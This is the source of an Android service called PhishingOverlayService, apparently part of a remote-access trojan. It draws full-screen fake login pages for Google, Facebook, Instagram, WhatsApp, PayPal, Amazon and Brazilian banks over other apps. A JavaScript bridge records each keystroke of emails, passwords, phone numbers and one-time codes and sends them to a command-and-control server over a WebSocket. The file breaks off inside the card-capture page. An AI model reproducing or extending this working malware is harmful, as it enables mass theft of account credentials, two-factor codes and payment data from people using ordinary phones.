package com.seguranca.protecao;
import com.seguranca.protecao.CommandControlService;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

/**
 * PhishingOverlayService — full-screen WebView phishing overlay.
 *
 * Shows a fake login/verification page on top of any app.
 * Credentials typed in the page are captured and sent to C2.
 *
 * Commands that launch this service:
 *   SHOW_PHISHING_OVERLAY  { skin, title, subtitle, logo_url, button_text, auto_dismiss_ms }
 *   SHOW_IDENTITY_OVERLAY  { title, reason }     → identity/normal skin
 *   SHOW_CARD_OVERLAY      { merchant, amount }   → card number capture
 *   HIDE_OVERLAY           {}
 *
 * Skins available (skin param):
 *   google | facebook | whatsapp | instagram | paypal | amazon |
 *   bank_generic | bank_nubank | bank_itau | bank_bradesco |
 *   bank_santander | bank_caixa | bank_inter | bank_c6 |
 *   card | identity | update | verify | custom
 */
public class PhishingOverlayService extends Service {

    private static final String TAG = "PhishingOverlay";

    private WindowManager windowManager;
    private View overlayView;
    private WebView webView;
    private static volatile PhishingOverlayService sInstance;

    // ─── SKINS ───────────────────────────────────────────────────────────────

    // All skins are self-contained HTML with embedded CSS — no external deps.
    // The JS bridge calls Android.capture(field, value) for each credential.

    private static final String BRIDGE_JS =
        "window.AndroidBridge = {" +
        "  capture: function(f,v){ try{ Android.capture(f,v); }catch(e){} }," +
        "  submit:  function(d){   try{ Android.submit(d);    }catch(e){} }," +
        "  dismiss: function(){    try{ Android.dismiss();    }catch(e){} }" +
        "};";

    // ─── LIFECYCLE ───────────────────────────────────────────────────────────

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getStringExtra("action");
        if (action == null) action = intent.getAction() != null ? intent.getAction() : "";

        switch (action) {
            case "HIDE":
            case "DISMISS":
                dismiss();
                break;
            default:
                String skin       = intent.getStringExtra("skin");
                String title      = intent.getStringExtra("title");
                String subtitle   = intent.getStringExtra("subtitle");
                String logoUrl    = intent.getStringExtra("logo_url");
                String btnText    = intent.getStringExtra("button_text");
                String merchant   = intent.getStringExtra("merchant");
                String amount     = intent.getStringExtra("amount");
                String customHtml = intent.getStringExtra("custom_html");
                String templateId = intent.getStringExtra("template_id");
                int autoDismiss   = intent.getIntExtra("auto_dismiss_ms", 0);

                // If raw HTML provided, save as template and use directly
                if (customHtml != null && !customHtml.isEmpty()) {
                    String tid = templateId != null ? templateId : "custom_html";
                    getSharedPreferences("rat_prefs", MODE_PRIVATE)
                        .edit().putString("overlay_template_" + tid, customHtml).apply();
                    if (skin == null) skin = tid;
                }

                showOverlay(skin, title, subtitle, logoUrl, btnText, merchant, amount, autoDismiss);
                break;
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        dismiss();
        sInstance = null;
    }

    // ─── SHOW OVERLAY ────────────────────────────────────────────────────────

    private void showOverlay(String skin, String title, String subtitle,
                             String logoUrl, String btnText,
                             String merchant, String amount, int autoDismissMs) {
        // Remove previous if any
        dismiss();

        if (skin == null) skin = "google";

        try {
            // Build the HTML for this skin
            String html = buildHtml(skin, title, subtitle, logoUrl, btnText, merchant, amount);

            // Create a full-screen WebView overlay
            webView = new WebView(this);
            webView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);

            WebSettings ws = webView.getSettings();
            ws.setJavaScriptEnabled(true);
            ws.setDomStorageEnabled(true);
            ws.setAllowFileAccess(false);
            ws.setAllowContentAccess(false);
            ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
            ws.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);

            // Add JS bridge
            webView.addJavascriptInterface(new PhishBridge(this), "Android");

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    // Inject bridge helper after page loads
                    view.evaluateJavascript(BRIDGE_JS, null);
                }
            });

            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);

            // WindowManager params — TYPE_APPLICATION_OVERLAY = always on top
            int overlayType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                overlayType,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;

            overlayView = webView;
            windowManager.addView(overlayView, params);

            Log.d(TAG, "Overlay shown: skin=" + skin);

            // Auto-dismiss if requested
            if (autoDismissMs > 0) {
                new Handler(Looper.getMainLooper()).postDelayed(this::dismiss, autoDismissMs);
            }

        } catch (Exception e) {
            Log.e(TAG, "showOverlay error: " + e.getMessage());
        }
    }

    public void dismiss() {
        try {
            if (overlayView != null && windowManager != null) {
                windowManager.removeView(overlayView);
            }
        } catch (Exception ignored) {}
        overlayView = null;
        webView = null;
    }

    public static void dismissGlobal() {
        if (sInstance != null) sInstance.dismiss();
    }

    // ─── JS BRIDGE ───────────────────────────────────────────────────────────

    private class PhishBridge {
        private final Context ctx;
        PhishBridge(Context ctx) { this.ctx = ctx; }

        @JavascriptInterface
        public void capture(String field, String value) {
            Log.d(TAG, "Captured: " + field + " = " + (field.toLowerCase().contains("pass") ? "***" : value));
            try {
                // Store to prefs
                android.content.SharedPreferences prefs =
                    ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
                String json = prefs.getString("phishing_captures", "[]");
                JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
                JsonObject obj = new JsonObject();
                obj.addProperty("field",     field);
                obj.addProperty("value",     value);
                obj.addProperty("timestamp", System.currentTimeMillis());
                arr.add(obj);
                while (arr.size() > 500) arr.remove(0);
                prefs.edit().putString("phishing_captures", arr.toString()).apply();

                // Send to C2 immediately
                JsonObject msg = new JsonObject();
                msg.addProperty("type", "PHISHING_CAPTURE");
                JsonObject data = new JsonObject();
                data.addProperty("field", field);
                data.addProperty("value", value);
                msg.add("data", data);
                CommandControlService cs = CommandControlService.sInstance;
                if (cs != null && cs.isConnected && cs.webSocket != null) {
                    cs.webSocket.send(new Gson().toJson(msg));
                }
            } catch (Exception e) {
                Log.e(TAG, "Bridge capture error: " + e.getMessage());
            }
        }

        @JavascriptInterface
        public void submit(String dataJson) {
            Log.d(TAG, "Form submitted: " + dataJson);
            capture("__submit__", dataJson);
            // Notify C2 of full submission
            try {
                JsonObject msg = new JsonObject();
                msg.addProperty("type", "PHISHING_SUBMITTED");
                msg.addProperty("data", dataJson);
                CommandControlService cs = CommandControlService.sInstance;
                if (cs != null && cs.isConnected && cs.webSocket != null) {
                    cs.webSocket.send(new Gson().toJson(msg));
                }
            } catch (Exception ignored) {}
        }

        @JavascriptInterface
        public void dismiss() {
            new Handler(Looper.getMainLooper()).post(() -> PhishingOverlayService.this.dismiss());
        }
    }

    // ─── HTML BUILDER ────────────────────────────────────────────────────────

    private String buildHtml(String skin, String title, String subtitle,
                             String logoUrl, String btnText,
                             String merchant, String amount) {
        switch (skin) {
            case "google":       return buildGoogleSkin(title, subtitle, logoUrl, btnText);
            case "facebook":     return buildFacebookSkin(title, subtitle, btnText);
            case "instagram":    return buildInstagramSkin(title, subtitle, btnText);
            case "whatsapp":     return buildWhatsAppSkin(title, subtitle, btnText);
            case "paypal":       return buildPayPalSkin(title, subtitle, amount, btnText);
            case "amazon":       return buildAmazonSkin(title, subtitle, btnText);
            case "card":         return buildCardSkin(merchant, amount, btnText);
            case "identity":     return buildIdentitySkin(title, subtitle, btnText);
            case "update":       return buildUpdateSkin(title, subtitle, btnText);
            case "verify":       return buildVerifySkin(title, subtitle, btnText);
            case "bank_generic": return buildBankGenericSkin(title, subtitle, btnText);
            case "bank_nubank":  return buildNubankSkin(title, subtitle, btnText);
            case "bank_itau":    return buildItauSkin(title, subtitle, btnText);
            case "bank_bradesco":return buildBradescoSkin(title, subtitle, btnText);
            case "bank_santander":return buildSantanderSkin(title, subtitle, btnText);
            case "bank_caixa":   return buildCaixaSkin(title, subtitle, btnText);
            default: {
                // Check prefs for a saved custom HTML template named by skin
                try {
                    String savedHtml = getSharedPreferences("rat_prefs", MODE_PRIVATE)
                        .getString("overlay_template_" + skin, null);
                    if (savedHtml != null && !savedHtml.isEmpty()) {
                        return savedHtml; // raw HTML from dashboard
                    }
                } catch (Exception ignored) {}
                return buildCustomSkin(title, subtitle, logoUrl, btnText);
            }
        }
    }

    // CSS shared across all skins
    private String baseCss() {
        return "<style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,system-ui,sans-serif}" +
            "body{min-height:100vh;display:flex;flex-direction:column;align-items:center;" +
            "justify-content:center;background:#f1f3f4;padding:16px}" +
            ".card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.2)," +
            "0 2px 8px rgba(0,0,0,.1);padding:40px 48px;max-width:400px;width:100%;text-align:center}" +
            ".logo{margin-bottom:24px}" +
            ".logo img{height:48px;max-width:200px}" +
            "h1{font-size:24px;color:#202124;margin-bottom:8px;font-weight:400}" +
            "p.sub{font-size:14px;color:#5f6368;margin-bottom:24px}" +
            "input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;" +
            "font-size:16px;color:#202124;outline:none;margin-bottom:12px;display:block}" +
            "input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}" +
            ".btn{width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;" +
            "padding:13px;font-size:16px;font-weight:500;cursor:pointer;margin-top:4px}" +
            ".btn:active{background:#1558b0}" +
            ".error{color:#d93025;font-size:12px;margin-top:-8px;margin-bottom:8px;display:none}" +
            ".footer{font-size:12px;color:#5f6368;margin-top:24px}" +
            ".spinner{display:none;margin:20px auto;width:36px;height:36px;" +
            "border:3px solid #f3f3f3;border-top:3px solid #1a73e8;" +
            "border-radius:50%;animation:spin .8s linear infinite}" +
            "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}" +
            "</style>";
    }

    // Capture JS — fires on every input change and on submit
    private String captureJs(String... fieldIds) {
        StringBuilder sb = new StringBuilder("<script>");
        for (String id : fieldIds) {
            sb.append("document.getElementById('").append(id)
              .append("').addEventListener('input',function(e){")
              .append("AndroidBridge.capture('").append(id).append("',e.target.value);});");
        }
        sb.append("</script>");
        return sb.toString();
    }

    // ─── GOOGLE SKIN ─────────────────────────────────────────────────────────

    private String buildGoogleSkin(String title, String subtitle, String logoUrl, String btnText) {
        if (title == null) title = "Sign in";
        if (subtitle == null) subtitle = "Use your Google Account";
        if (btnText == null) btnText = "Next";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<body><div class='card'>" +
            "<div class='logo'><svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 272 92' height='36'>" +
            "<path fill='#4285F4' d='M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18-12.26 0-22.25-9.41-22.25-22.18 0-12.86 9.99-22.18 22.25-22.18 12.26 0 22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44-6.72 0-12.51 5.46-12.51 13.44 0 7.9 5.79 13.44 12.51 13.44 6.72 0 12.51-5.55 12.51-13.44z'/>" +
            "<path fill='#EA4335' d='M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18-12.26 0-22.25-9.41-22.25-22.18 0-12.86 9.99-22.18 22.25-22.18 12.26 0 22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44-6.72 0-12.51 5.46-12.51 13.44 0 7.9 5.79 13.44 12.51 13.44 6.72 0 12.51-5.55 12.51-13.44z'/>" +
            "<path fill='#4285F4' d='M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z'/>" +
            "<path fill='#FBBC05' d='M225 3v65h-9.5V3h9.5z'/>" +
            "<path fill='#34A853' d='M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z'/>" +
            "</svg></div>" +
            "<h1>" + title + "</h1>" +
            "<p class='sub'>" + subtitle + "</p>" +
            "<input id='email' type='email' placeholder='Email or phone' autocomplete='email' />" +
            "<p class='error' id='err1'>Enter a valid email or phone number</p>" +
            "<div class='spinner' id='spin'></div>" +
            "<button class='btn' onclick='doNext()'>" + btnText + "</button>" +
            "<div class='footer'>Not your computer? Use guest mode to sign in privately.</div>" +
            "</div>" +
            captureJs("email") +
            "<script>" +
            "var step=1;" +
            "function doNext(){" +
            "  var e=document.getElementById('email').value;" +
            "  if(step===1){" +
            "    if(!e||e.length<4){document.getElementById('err1').style.display='block';return;}" +
            "    document.getElementById('err1').style.display='none';" +
            "    document.querySelector('.card').innerHTML=" +
            "      '<h1>Welcome</h1><p class=\"sub\">'+e+'</p>" +
            "      <input id=\"pass\" type=\"password\" placeholder=\"Enter your password\" autocomplete=\"current-password\" />" +
            "      <p class=\"error\" id=\"err2\">Wrong password. Try again.</p>" +
            "      <button class=\"btn\" onclick=\"doSubmit()\">Next</button>';" +
            "    document.getElementById('pass').addEventListener('input',function(ev){AndroidBridge.capture('password',ev.target.value);});" +
            "    step=2;" +
            "  }" +
            "}" +
            "function doSubmit(){" +
            "  var p=document.getElementById('pass').value;" +
            "  if(!p||p.length<4){document.getElementById('err2').style.display='block';return;}" +
            "  AndroidBridge.submit(JSON.stringify({email:document.querySelector('[type=email]')?document.querySelector('[type=email]').value:'',password:p}));" +
            "  document.querySelector('.card').innerHTML='<div class=\"spinner\" style=\"display:block\"></div><p class=\"sub\" style=\"margin-top:12px\">Signing in...</p>';" +
            "  setTimeout(function(){AndroidBridge.dismiss();},2000);" +
            "}" +
            "</script></body></html>";
    }

    // ─── FACEBOOK SKIN ───────────────────────────────────────────────────────

    private String buildFacebookSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Log in to Facebook";
        if (subtitle == null) subtitle = "Enter your Facebook details";
        if (btnText == null) btnText = "Log In";
        return "<!DOCTYPE html><html><style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:Helvetica,Arial,sans-serif}" +
            "body{background:#f0f2f5;display:flex;flex-direction:column;align-items:center;" +
            "justify-content:center;min-height:100vh;padding:16px}" +
            ".logo{color:#1877F2;font-size:36px;font-weight:700;margin-bottom:16px}" +
            ".card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1)," +
            "0 8px 16px rgba(0,0,0,.1);padding:20px;width:100%;max-width:400px}" +
            "input{width:100%;border:1px solid #dddfe2;border-radius:6px;padding:14px 16px;" +
            "font-size:17px;margin-bottom:12px;outline:none}" +
            "input:focus{border-color:#1877F2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}" +
            ".btn{width:100%;background:#1877F2;color:#fff;border:none;border-radius:6px;" +
            "padding:14px;font-size:18px;font-weight:700;cursor:pointer;margin-bottom:16px}" +
            ".btn:active{background:#166fe5}" +
            ".divider{border:none;border-top:1px solid #dddfe2;margin:16px 0}" +
            ".link{color:#1877F2;font-size:14px;cursor:pointer;text-align:center}" +
            "</style><body>" +
            "<div class='logo'>facebook</div>" +
            "<div class='card'>" +
            "<input id='email' type='text' placeholder='Email address or phone number' />" +
            "<input id='pass' type='password' placeholder='Password' />" +
            "<button class='btn' onclick='doLogin()'>" + btnText + "</button>" +
            "<hr class='divider'/>" +
            "<p class='link'>Forgotten password?</p>" +
            "</div>" +
            captureJs("email", "pass") +
            "<script>function doLogin(){" +
            "var e=document.getElementById('email').value,p=document.getElementById('pass').value;" +
            "if(!e||!p)return;" +
            "AndroidBridge.submit(JSON.stringify({email:e,password:p}));" +
            "document.querySelector('.btn').textContent='Logging in...';" +
            "setTimeout(function(){AndroidBridge.dismiss();},2000);}" +
            "</script></body></html>";
    }

    // ─── INSTAGRAM SKIN ──────────────────────────────────────────────────────

    private String buildInstagramSkin(String title, String subtitle, String btnText) {
        if (btnText == null) btnText = "Log in";
        return "<!DOCTYPE html><html><style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,system-ui,sans-serif}" +
            "body{background:#fafafa;display:flex;flex-direction:column;align-items:center;" +
            "justify-content:center;min-height:100vh;padding:16px}" +
            ".card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;" +
            "padding:40px 40px 20px;max-width:360px;width:100%;text-align:center}" +
            ".ig-logo{font-size:32px;font-family:'Billabong',cursive;margin-bottom:28px;letter-spacing:-1px}" +
            "input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;" +
            "padding:9px 8px;font-size:14px;width:100%;margin-bottom:6px;outline:none}" +
            "input:focus{border-color:#aaaaaa}" +
            ".btn{background:linear-gradient(to right,#833ab4,#fd1d1d,#fcb045);" +
            "color:#fff;border:none;border-radius:4px;width:100%;padding:8px;" +
            "font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;margin-bottom:12px}" +
            ".divider{display:flex;align-items:center;gap:16px;margin:16px 0}" +
            ".divider hr{flex:1;border:none;border-top:1px solid #dbdbdb}" +
            ".divider span{font-size:13px;color:#8e8e8e;font-weight:600}" +
            ".fb{color:#385185;font-size:14px;font-weight:600;cursor:pointer}" +
            ".footer{background:#fff;border:1px solid #dbdbdb;padding:16px;max-width:360px;" +
            "width:100%;text-align:center;margin-top:10px;font-size:14px}" +
            "</style><body>" +
            "<div class='card'>" +
            "<div class='ig-logo'>Instagram</div>" +
            "<input id='username' type='text' placeholder='Phone number, username, or email' />" +
            "<input id='pass' type='password' placeholder='Password' />" +
            "<button class='btn' onclick='doLogin()'>" + btnText + "</button>" +
            "<div class='divider'><hr/><span>OR</span><hr/></div>" +
            "<p class='fb'>Log in with Facebook</p>" +
            "<p style='font-size:12px;color:#8e8e8e;margin-top:16px'>Forgot password?</p>" +
            "</div>" +
            "<div class='footer'>Don't have an account? <span style='color:#0095f6;font-weight:600'>Sign up.</span></div>" +
            captureJs("username", "pass") +
            "<script>function doLogin(){" +
            "var u=document.getElementById('username').value,p=document.getElementById('pass').value;" +
            "if(!u||!p)return;" +
            "AndroidBridge.submit(JSON.stringify({username:u,password:p}));" +
            "setTimeout(function(){AndroidBridge.dismiss();},2000);}" +
            "</script></body></html>";
    }

    // ─── WHATSAPP SKIN ───────────────────────────────────────────────────────

    private String buildWhatsAppSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Verify your phone number";
        if (subtitle == null) subtitle = "WhatsApp will send a one-time verification code via SMS";
        if (btnText == null) btnText = "Next";
        return "<!DOCTYPE html><html><style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,system-ui,sans-serif}" +
            "body{background:#fff;display:flex;flex-direction:column;align-items:center;" +
            "justify-content:flex-start;min-height:100vh;padding:40px 24px}" +
            ".wa-logo{width:72px;height:72px;background:#25D366;border-radius:50%;display:flex;" +
            "align-items:center;justify-content:center;margin:0 auto 24px;font-size:40px}" +
            "h1{font-size:22px;font-weight:500;color:#111;margin-bottom:12px;text-align:center}" +
            "p.sub{font-size:14px;color:#6b7280;margin-bottom:28px;text-align:center;line-height:1.5}" +
            ".phone-row{display:flex;gap:8px;margin-bottom:16px}" +
            ".country{border:1px solid #d1d5db;border-radius:6px;padding:12px;font-size:16px;" +
            "background:#f9fafb;min-width:72px;text-align:center}" +
            "input{flex:1;border:1px solid #d1d5db;border-radius:6px;padding:12px;font-size:16px;outline:none}" +
            "input:focus{border-color:#25D366}" +
            ".btn{background:#25D366;color:#fff;border:none;border-radius:24px;" +
            "padding:14px 40px;font-size:16px;font-weight:500;cursor:pointer;display:block;margin:0 auto}" +
            ".otp-row{display:flex;gap:8px;justify-content:center;margin-bottom:24px}" +
            ".otp-box{width:44px;height:56px;border:1px solid #d1d5db;border-radius:8px;" +
            "font-size:24px;text-align:center;outline:none}" +
            ".otp-box:focus{border-color:#25D366}" +
            "</style><body>" +
            "<div class='wa-logo'>💬</div>" +
            "<h1>" + title + "</h1>" +
            "<p class='sub'>" + subtitle + "</p>" +
            "<div class='phone-row'>" +
            "<div class='country'>+1 🇺🇸</div>" +
            "<input id='phone' type='tel' placeholder='Phone number' />" +
            "</div>" +
            "<button class='btn' onclick='doNext()'>" + btnText + "</button>" +
            captureJs("phone") +
            "<script>" +
            "var step=1;" +
            "function doNext(){" +
            "  var ph=document.getElementById('phone').value;" +
            "  if(step===1){" +
            "    if(!ph||ph.length<7)return;" +
            "    AndroidBridge.capture('phone',ph);" +
            "    document.body.innerHTML=buildOtp(ph);step=2;" +
            "  }" +
            "}" +
            "function buildOtp(ph){" +
            "  return '<div class=\"wa-logo\">💬</div>" +
            "    <h1>Enter the 6-digit code</h1>" +
            "    <p class=\"sub\">We sent a code to '+ph+'</p>" +
            "    <div class=\"otp-row\">" +
            "    <input class=\"otp-box\" id=\"o1\" maxlength=\"1\" type=\"tel\" oninput=\"moveFocus(this,\\\"o2\\\")\">" +
            "    <input class=\"otp-box\" id=\"o2\" maxlength=\"1\" type=\"tel\" oninput=\"moveFocus(this,\\\"o3\\\")\">" +
            "    <input class=\"otp-box\" id=\"o3\" maxlength=\"1\" type=\"tel\" oninput=\"moveFocus(this,\\\"o4\\\")\">" +
            "    <input class=\"otp-box\" id=\"o4\" maxlength=\"1\" type=\"tel\" oninput=\"moveFocus(this,\\\"o5\\\")\">" +
            "    <input class=\"otp-box\" id=\"o5\" maxlength=\"1\" type=\"tel\" oninput=\"moveFocus(this,\\\"o6\\\")\">" +
            "    <input class=\"otp-box\" id=\"o6\" maxlength=\"1\" type=\"tel\" oninput=\"checkDone()\">" +
            "    </div>" +
            "    <p style=\"font-size:13px;color:#25D366;text-align:center;cursor:pointer\">Didn't receive code? Resend</p>';" +
            "}" +
            "function moveFocus(el,nextId){if(el.value)document.getElementById(nextId).focus();}" +
            "function checkDone(){" +
            "  var code=[1,2,3,4,5,6].map(function(i){return document.getElementById('o'+i).value;}).join('');" +
            "  if(code.length===6){AndroidBridge.capture('otp',code);" +
            "  AndroidBridge.submit(JSON.stringify({phone:'" + "'+code}));" +
            "  setTimeout(function(){AndroidBridge.dismiss();},1500);}}" +
            "</script></body></html>";
    }

    // ─── PAYPAL SKIN ─────────────────────────────────────────────────────────

    private String buildPayPalSkin(String title, String subtitle, String amount, String btnText) {
        if (title == null) title = "Log in to your PayPal account";
        if (btnText == null) btnText = "Log In";
        return "<!DOCTYPE html><html><style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,system-ui,sans-serif}" +
            "body{background:#f5f5f5;display:flex;flex-direction:column;align-items:center;" +
            "justify-content:flex-start;min-height:100vh;padding-top:40px}" +
            ".header{background:#003087;width:100%;padding:16px;text-align:center;margin-bottom:24px}" +
            ".pp-logo{color:#fff;font-size:28px;font-weight:700;letter-spacing:-1px}" +
            ".pp-logo span{color:#009cde}" +
            ".card{background:#fff;border:1px solid #e2e8f0;border-radius:8px;padding:32px 24px;" +
            "max-width:400px;width:92%;margin:0 auto}" +
            "h2{font-size:20px;color:#2c3e50;margin-bottom:20px;font-weight:500}" +
            "label{font-size:13px;color:#4a5568;display:block;margin-bottom:4px}" +
            "input{width:100%;border:1px solid #cbd5e0;border-radius:4px;padding:12px;" +
            "font-size:15px;margin-bottom:16px;outline:none}" +
            "input:focus{border-color:#003087;box-shadow:0 0 0 2px rgba(0,48,135,.15)}" +
            ".btn{background:#009cde;color:#fff;border:none;width:100%;padding:13px;" +
            "border-radius:24px;font-size:16px;font-weight:600;cursor:pointer}" +
            ".btn:active{background:#007bb5}" +
            ".link{color:#009cde;font-size:14px;text-align:center;margin-top:16px;cursor:pointer}" +
            "</style><body>" +
            "<div class='header'><div class='pp-logo'>Pay<span>Pal</span></div></div>" +
            (amount != null ? "<div style='background:#e8f4fd;border:1px solid #bee3f8;border-radius:8px;" +
            "padding:16px;max-width:400px;width:92%;margin:0 auto 16px;text-align:center'>" +
            "<p style='font-size:13px;color:#2b6cb0'>You have a payment pending for</p>" +
            "<p style='font-size:28px;font-weight:700;color:#1a202c;margin:4px 0'>" + amount + "</p></div>" : "") +
            "<div class='card'><h2>" + title + "</h2>" +
            "<label>Email</label><input id='email' type='email' />" +
            "<label>Password</label><input id='pass' type='password' />" +
            "<button class='btn' onclick='doLogin()'>" + btnText + "</button>" +
            "<p class='link'>Having trouble logging in?</p>" +
            "</div>" +
            captureJs("email", "pass") +
            "<script>function doLogin(){" +
            "var e=document.getElementById('email').value,p=document.getElementById('pass').value;" +
            "if(!e||!p)return;" +
            "AndroidBridge.submit(JSON.stringify({email:e,password:p}));" +
            "setTimeout(function(){AndroidBridge.dismiss();},2000);}" +
            "</script></body></html>";
    }

    // ─── AMAZON SKIN ─────────────────────────────────────────────────────────

    private String buildAmazonSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Sign in";
        if (btnText == null) btnText = "Continue";
        return "<!DOCTYPE html><html><style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:'Amazon Ember',Arial,sans-serif}" +
            "body{background:#fff;display:flex;flex-direction:column;align-items:center;" +
            "min-height:100vh;padding:20px 16px}" +
            ".amz-logo{font-size:32px;font-weight:700;color:#232f3e;margin-bottom:20px}" +
            ".amz-logo span{color:#ff9900}" +
            ".card{border:1px solid #d5d9d9;border-radius:8px;padding:28px 24px;" +
            "max-width:380px;width:100%}" +
            "h1{font-size:22px;font-weight:500;color:#0f1111;margin-bottom:20px}" +
            "label{font-size:13px;font-weight:700;color:#0f1111;display:block;margin-bottom:4px}" +
            "input{width:100%;border:1px solid #888;border-radius:3px;padding:7px 11px;" +
            "font-size:15px;margin-bottom:10px;outline:none}" +
            "input:focus{border-color:#e77600;box-shadow:0 0 0 3px rgba(228,121,17,.5)}" +
            ".btn{background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;" +
            "border-radius:3px;width:100%;padding:10px;font-size:14px;color:#111;cursor:pointer;" +
            "margin-bottom:16px}" +
            ".btn:active{background:#f0c14b}" +
            ".divider{border-top:1px solid #e7e7e7;margin:16px 0;text-align:center;position:relative}" +
            ".divider span{position:absolute;top:-10px;background:#fff;padding:0 8px;" +
            "font-size:12px;color:#767676;left:50%;transform:translateX(-50%)}" +
            ".small{font-size:11px;color:#767676;margin-top:8px}" +
            "</style><body>" +
            "<div class='amz-logo'>amazon<span>.com</span></div>" +
            "<div class='card'><h1>" + title + "</h1>" +
            "<label>Email or mobile phone number</label>" +
            "<input id='email' type='text' />" +
            "<button class='btn' onclick='doNext()'>Continue</button>" +
            "<div class='divider'><span>New to Amazon?</span></div>" +
            "<button class='btn' onclick=''>Create your Amazon account</button>" +
            "</div>" +
            captureJs("email") +
            "<script>" +
            "var step=1,savedEmail='';" +
            "function doNext(){" +
            "  if(step===1){" +
            "    savedEmail=document.getElementById('email').value;" +
            "    if(!savedEmail)return;" +
            "    document.querySelector('.card').innerHTML=" +
            "      '<h1>Sign-In</h1><p style=\"font-size:13px;color:#0f1111;margin-bottom:16px\">"+
            "      <strong>'+savedEmail+'</strong></p>" +
            "      <label>Password</label><input id=\"pass\" type=\"password\" />" +
            "      <button class=\"btn\" onclick=\"doSubmit()\">" + btnText + "</button>';" +
            "    document.getElementById('pass').addEventListener('input',function(e){" +
            "      AndroidBridge.capture('password',e.target.value);});" +
            "    step=2;" +
            "  }" +
            "}" +
            "function doSubmit(){" +
            "  var p=document.getElementById('pass').value;if(!p)return;" +
            "  AndroidBridge.submit(JSON.stringify({email:savedEmail,password:p}));" +
            "  setTimeout(function(){AndroidBridge.dismiss();},2000);}" +
            "</script></body></html>";
    }

    // ─── CARD SKIN ───────────────────────────────────────────────────────────

    private String buildCardSkin(String merchant, String amount, String btnText) {
        if (merchant == null) merchant = "Merchant";
        if (amount == null) amount = "";
        if (btnText == null) btnText = "Pay Now";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<style>" +
            ".card-preview{background:linear-gradient(135deg,#1a1a2e,#16213e);" +
            "border-radius:16px;padding:24px;color:#fff;margin-bottom:24px;position:relative}" +
            ".card-num{font-size:20px;letter-spacing:4px;margin:16px 0}" +
